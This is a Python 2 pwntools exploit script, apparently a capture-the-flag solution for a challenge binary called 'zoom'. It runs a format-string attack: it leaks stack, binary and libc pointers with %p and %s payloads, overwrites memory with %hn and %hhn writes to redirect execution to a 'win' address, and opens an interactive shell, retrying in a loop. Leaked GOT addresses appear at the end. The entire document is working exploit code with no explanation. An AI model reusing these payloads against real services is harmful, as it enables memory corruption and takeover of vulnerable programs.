#!/usr/bin/python2

from pwn import *

#r = remote('zoom.hack.fe-ctf.dk', 1337)
r = process('./zoom_patched')

def checkkkk(i):
	payload = '%{}$p'.format(i)
	r.sendlineafter('?\n>', payload)
	return r.recvline().strip()

def leak_libc(base_ptr):
	base_ptr = int(base_ptr[2:], 16) - 0x1241 + 0x4fa8
	print 'start leak'
	for i in range(11):
		payload = '%8$s.'+p64(base_ptr + i*8)
		r.sendlineafter('?\n>',payload)
		chef = r.recvuntil('.', drop=True)
		#chef = r.recvline().strip()
		chef = chef[1:].ljust(8, '\x00')
		log.info('{}: {}'.format(hex(base_ptr+i*8),hex(u64(chef))))


def start_loop(offset):
	offset += 0x60
	r.sendlineafter('?\n>','%{}x%6$hhn'.format(offset))
	# offset = offset - 0x20
	r.sendlineafter('?\n>','%10$p')
	stack_ptr = r.recvline().strip()
	log.info('stack ptr: {}'.format(stack_ptr))
	count = 1
	r.sendlineafter('?\n>','%11$p')
	base_ptr = r.recvline().strip()
	#leak_libc(base_ptr)
	count += 1
	to_write = int(stack_ptr[10:], 16)+0xb0
	payload = '%{}x%{}$hn'.format(to_write, 22+count*12)
	r.sendlineafter('?\n>',payload)
	#check = False
	# if len(payload) == 13:
	# 	#count += 1
	# 	#print 'hit4'
	# 	#recvuntil('?\n>')
	# 	#check = True
	count += 2

	to_write = int(base_ptr[10:], 16) + 0x29A
	payload = '%{}x%{}$hn'.format(to_write, 28+count*12)
	r.sendlineafter('?\n>',payload) #write the win address
	if len(payload) == 13:
		print 'hit1'
		count += 1
		r.recvuntil('?\n>')
	count += 1


	#init a ptr to the heap in the stack
	# temp = int(stack_ptr[12:], 16)
	# print hex(temp)
	# if temp <= 0xa0:
	# 	to_write = temp +0x50
	# 	payload = '%{}x%{}$hhn'.format(to_write, 40)
	# 	print "less"
	# else:

#	r.sendlineafter('?\n>','%40$p')
	to_write = int(stack_ptr[10:], 16) + 0x50
	payload = '%{}x%{}$hn'.format(to_write, 40)
	r.sendlineafter('?\n>',payload)
	if len(payload) == 13:
		print 'hit2'
		count += 1
		r.recvuntil('?\n>')
	count += 1

	to_write = offset - 0x1000 -0x3
	payload = '%{}x%{}$hn'.format(to_write, 70)
	r.sendlineafter('?\n>',payload)
	if len(payload) == 13:
		print 'hit3'
		count += 1
		r.recvuntil('?\n>')
	count += 1
	print count
	# r.sendlineafter('?\n>','%{}x%{}$hn'.format(to_write, 40)) #set a ptr to the heap in the stack
	# count += 1
	# to_insert = (int(stack_ptr[10:],16)+0x50+2)
	# print to_insert
	# r.sendlineafter('?\n>','%{}x%{}$hn'.format(to_insert, 28+(count*12)-6))
	# count += 1
	# print heap_leak[6:-4]
	# r.sendlineafter('?\n>','%{}x%{}$hn'.format(int(heap_leak[6:-4],16), 28+count*12))
	# count += 1
	# r.sendlineafter('?\n>','%{}x%{}$hhn'.format((int(stack_ptr[12:],16)+0x50)&0xff, 28+(count*12)+24))
	# count += 1
	return stack_ptr, base_ptr, count

def build_chain(stack_ptr, count):
	offset = 0x60-3
	temp = stack_ptr[2:]
	to_write = [temp[i:i+2] for i in range(0, len(temp), 2)]
	#print to_write
	## TODO ADD LOGIC FOR SMALLER WRITE VALUES!!!!
	for write in to_write:
		value = int(write,16)
		payload1 = '%{}x%{}$hhn'.format(value, 26+(count*12))
		r.sendlineafter('?\n>',payload1)
		if value >=100:
			r.recvuntil('?\n>')
			count += 1
		count += 1
		offset -= 1
		r.sendlineafter('?\n>','%{}x%{}$hhn'.format(offset, -26+(count*12)))
		count += 1
	# r.sendlineafter('?\n>','%{}x%{}$hhn'.format(0x58, -2+(count*12)))
	# count += 1
	return count

def main():
	global r
	#chef = raw_input('manually check maps')
	while True:
		try:
			chef = 0x1000
			stack_ptr, base_ptr, count = start_loop(chef)
			#log.info('heap leak: {}'.format(hex(heap_leak)))
			#gdb.attach(r)
			count = build_chain(stack_ptr, count) #build a ptr to memory on the stack
			log.info('write done')
			r.sendlineafter('?\n>','%{}x%{}$hn'.format(0x58, 6))
			#print count
			r.interactive()

		except:
			r.close()
			#r = remote('zoom.hack.fe-ctf.dk', 1337)
			r=process('./zoom_patched')

if __name__ == '__main__':
	main()

"""
0x55e087356f90: 0x7fa37ac5f420 puts
0x556a7f956f98: 0x7fab9bcfca70 __stack_chk_fail
0x55b8a4c1dfa0: 0x7f321f55e290 system
0x5570e7811fa8: 0x7fb8ef395c90 printf
"""
